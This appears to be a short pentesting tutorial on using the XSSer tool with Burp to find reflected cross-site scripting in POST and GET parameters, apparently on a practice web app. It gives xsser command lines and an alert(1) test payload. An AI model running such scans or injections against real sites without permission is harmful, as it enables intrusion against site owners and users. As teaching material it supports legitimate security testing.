
### What is XSS ?

Cross-site scripting is a type of security vulnerability that can be found in some web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users.

### XSSer Tool for Reflected XSS (POST)

**1. Identify Target and Capture POST Request with Burp**

- Start by entering text in the input prompt to identify XSS vulnerability. Use Burp to capture the corresponding POST request.

**2. Utilize XSSer on the Target**

- Execute XSSer on the target URL, setting the payload (`-p`) to the captured POST request. For instance:
```bash
xsser --url "http://<target-ip>/index.php?page=dns_lookup.php" -p "target_hosts=XSS&dns-lookup-php-submit-button=Lookup+DNS"
```
  - Add `XSS` in the payload to indicate the vulnerable variable.
  - Optionally, use `--auto` to assess the input field's vulnerability level automatically.

**3. Test with Custom JS Payload**

- Check if the input field is susceptible to a custom JS payload. Use `--Fp`. Example:
```bash
xsser --url "http://<target-ip>/index.php?page=dns_lookup.php" -p "target_hosts=XSS&dns-lookup-php-submit-button=Lookup+DNS" --Fp "<script>alert(1)</script>"
  ```
  - If vulnerable, XSSer will report `XSS FOUND!` along with the payload encoded into a new URL which can be opened in the browser.

### `XSSer` for requested XSS (GET)

**1. Identify Target and Capture POST Request with Burp**

- Start by entering text in the input prompt to identify XSS vulnerability. Use Burp to capture the corresponding POST request.

**2. Execute XSSer on the target URL.**

- In this case, the setting up the payload is not required. 
```bash
xsser --url "http://<target-ip>/index.php?page-user-poll.php&csrf-token=&choice=XSS&initials=&user-poll-php-submit-button=Submit+Vote"
```
- We can also use `--Fp` here to  set a custom payload. 